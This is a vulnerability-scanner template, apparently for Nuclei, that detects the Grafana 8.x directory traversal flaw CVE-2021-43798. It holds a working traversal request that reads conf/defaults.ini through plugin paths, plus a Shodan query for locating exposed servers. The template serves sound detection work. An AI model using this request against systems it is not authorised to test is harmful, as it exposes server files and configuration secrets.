@@ -1,0 +1,50 @@
+id: grafana-file-read
+
+info:
+  name: Grafana 8.x - Local File Inclusion
+  author: z0ne,dhiyaneshDk,jeya.seelan,dwisiswant0,j4vaovo
+  severity: high
+  description: Grafana 8.x is vulnerable to local file inclusion.
+  reference:
+    - https://grafana.com/blog/2021/12/08/an-update-on-0day-cve-2021-43798-grafana-directory-traversal/
+    - https://nosec.org/home/detail/4914.html
+    - https://github.com/jas502n/Grafana-VulnTips
+    - https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
+    - https://twitter.com/naglinagli/status/1468155313182416899
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-43798
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cve-id: CVE-2021-43798
+    cwe-id: CWE-22
+    cpe: cpe:2.3:a:grafana:grafana:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 325
+    shodan-query: title:"Grafana"
+    product: grafana
+    vendor: grafana
+  tags: grafana,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/public/plugins/{{pluginSlug}}/../../../../../conf/defaults.ini"
+
+    payloads:
+      pluginSlug: helpers/wordlists/grafana-plugins.txt
+    threads: 50
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "socket = /tmp/grafana.sock"
+          - "http_port"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a00483046022100f865210932dd223ae9a42470b5e1a699d6472f49cc8996d74c0d77cffa7c022d02210085d2b77fc1eab78ddeae1b556d02c6e9bcd3aa0a38eb9223a86f5bbaf9ab33be:922c64590222798bb761d5b6d8e72950
